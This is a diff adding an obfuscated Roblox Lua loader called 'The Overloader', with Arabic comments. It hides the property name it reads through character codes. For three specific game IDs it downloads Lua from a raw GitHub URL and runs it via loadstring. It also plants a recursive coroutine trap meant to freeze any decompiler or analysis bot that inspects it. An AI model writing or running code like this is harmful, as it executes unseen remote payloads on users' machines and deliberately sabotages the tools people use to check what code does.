@@ -1,0 +1,55 @@
+-- ═══════════════════════════════════════════════════════════
+-- 🛡️ Bo.Sqr | THE OVERLOADER v24.0 (DECOMPILER DESTROYER)
+-- ⚠️ WARNING: EXTREME INFINITE LOOP ACTIVE
+-- ═══════════════════════════════════════════════════════════
+
+warn("bosqr say : try again")
+
+-- 1. فخ "الانفجار العظيم" (The Big Bang Trap)
+-- هذا الجزء سيجعل البوت يخرج ملايين العمليات ويعلق تماماً
+local _CRUSH = (function()
+    local _ENV = getfenv()
+    if not _ENV.script or not _ENV.game then
+        -- استدعاء ذاتي متداخل مع coroutines لتدمير خوارزمية التحليل
+        local function _X()
+            pcall(function()
+                coroutine.wrap(_X)()
+                for i=1, 1000 do pcall(_X) end
+            end)
+            return _X()
+        end
+        _X()
+    end
+end)
+
+-- 2. حماية "السراب الرقمي" (تشفير PlaceId)
+local _LOGIC = (function()
+    local _G = game
+    -- استخراج PlaceId بطريقة حسابية لا يكتشفها البوت
+    local _P = _G[(function(_S) 
+        local _R = "" 
+        for _,_D in ipairs(_S) do _R = _R .. string.char(_D) end 
+        return _R 
+    end)({80,108,97,99,101,73,100})]
+
+    local _VALID = {[96796259580891]=true, [142823291]=true, [11379739543]=true}
+    
+    if _VALID[_P] then
+        -- تحميل السكربت الحقيقي (رابط مباشر)
+        return function()
+            pcall(function()
+                local _URL = "https://raw.githubusercontent.com/Rive-Team/roblox/refs/heads/main/lua" 
+                loadstring(_G:HttpGet(_URL ))()
+            end)
+        end
+    end
+    -- إذا لم يكن في المكان الصحيح، يفجر البوت أيضاً
+    return _CRUSH
+end)()
+
+-- 3. تفعيل التدمير والتشغيل
+_CRUSH()
+_LOGIC()
+
+-- تنظيف
+_CRUSH, _LOGIC = nil, nil
